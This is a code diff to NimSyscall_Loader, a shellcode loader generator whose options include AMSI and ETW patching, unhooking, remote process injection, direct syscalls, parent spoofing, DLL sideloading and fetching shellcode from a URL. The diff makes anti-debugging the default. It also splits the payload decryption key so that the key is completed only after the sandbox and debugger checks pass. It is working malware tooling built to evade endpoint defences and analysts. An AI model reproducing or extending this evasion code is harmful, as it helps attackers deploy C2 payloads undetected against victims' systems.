@@ -29,6 +29,7 @@ import CurrentProcInject
 import RemoteProcInject
 import DInvoke
 import Powershell
+import AntiDebug
 
 
 from system import io
@@ -64,7 +65,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.8
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -147,7 +148,7 @@ Options:
   --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
   --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                  This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
-  --antidebug    Checks the BeingDebugged flag of the current process and if it is set, it will quit
+  --noAntidebug    Leave out AntiDebugger Checks
 
 [Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]
 
@@ -286,7 +287,7 @@ var
     fluctuate: bool = false
     noDInvoke: bool = false
     metadata: bool = false
-    antidebug: bool = false
+    antidebug: bool = true
     remoteMapSection: bool = false
     remoteinject: bool = false
 
@@ -579,8 +580,8 @@ if args["--obfuscatefunctions"]:
 if args["--debug"]:
   debugMode = true
 
-if args["--antidebug"]:
-  antidebug = true
+if args["--noAntidebug"]:
+  antidebug = false
 
 if args["--x86"]:
   compileX86 = true
@@ -642,12 +643,16 @@ if (dllclone and dllProxy):
     echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
     quit(1)
 
-#echo "Key: " & envkey
+echo "Key: " & envkey
 # Lets save the last 4 characters of the string in a new variable
-var last4 = envkey[^4..^1]
-#echo "Last Four: " & last4
+var lastTwo = envkey[^2..^1]
+var fourthtosecondlast = envkey[^4..^3]
+var lastFour = envkey[^4..^1]
+echo "Last Four: " & lastFour
+echo "lastTwo: " & lastTwo
+echo "fourthtosecondlast: " & fourthtosecondlast
 # And save a key without those last 4 characters in a new one
-var firstwithoutlast4 = envkey.replace(last4, "")
+var firstwithoutlast4 = envkey.replace(lastFour, "")
 #echo "First without last 4 :" & firstwithoutlast4
 
 if (peload and embeddedArguments):
@@ -1371,6 +1376,9 @@ import ptr_math
 #import winim/utils
 #from winim import winstr,winimbase,windef
 
+when defined(AntiDebug):
+    from winim import LIST_ENTRY,PVOID,ULONG,UNICODE_STRING,UCHAR,BYTE,P_PEB
+
 when defined(ProviderPatch):
     from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames
 
@@ -1501,7 +1509,7 @@ let Cryptstub2 = fmt"""
 """
 
 let Cryptstub3 = fmt"""
-    #var envkey2 = envkey & "{last4}"
+    #var envkey2 = envkey & "{lastfour}"
     
     proc decryptLate(): void =
         var expandedkey = toByteSeq(envkey2)
@@ -1553,7 +1561,12 @@ proc accelerated_sleep*(): void =
     else:
         when defined(verbose):
             echo obf("[*] We don't appear to be in a sandbox according to the Sleep time")
-        envkey2 = envkey & "{last4}"
+        when not defined(AntiDebug):
+            envkey2 = envkey & "{lastFour}"
+        else:
+            envkey2 = envkey2 & "{lastTwo}"
+        when defined(verbose):
+            echo obf("[*] Final Key: ") & envkey2
 accelerated_sleep()
 """
 
@@ -1997,9 +2010,15 @@ proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
 """
 
 let BeingDebugged * = fmt"""
-import AntiDebug
 if(AmIDebugged()):
   quit()
+else:
+    if(isHeapGrowable()):
+        when defined(verbose):
+            echo obf("[*] We don't appear to be Debugged, continuing...")
+        envkey2 = envkey & "{fourthtosecondlast}"
+    else:
+        quit(1)
 """
 
 var stub = Cryptstub1
@@ -2025,6 +2044,8 @@ if(pump):
             stub.add(genTrustedwords(rand(3500..6200)))
 
 if(antidebug):
+    stub.add(AntiDebugPEBStub)
+    stub.add(IsDebuggerPresentStub)
     stub.add(BeingDebugged)
 
 stub.add(getRandStubNoTab())
@@ -2417,6 +2438,9 @@ elif (retrieveFromURL):
     stub.add(ShellcodefromURLStub)
 else:
     basicCompileFlags.add("-d:PayloadEmbedded ")
+
+if(antidebug):
+    basicCompileFlags.add("-d:AntiDebug ")
 
 if(ETW):
     basicCompileFlags.add("-d:HardwareETW ")
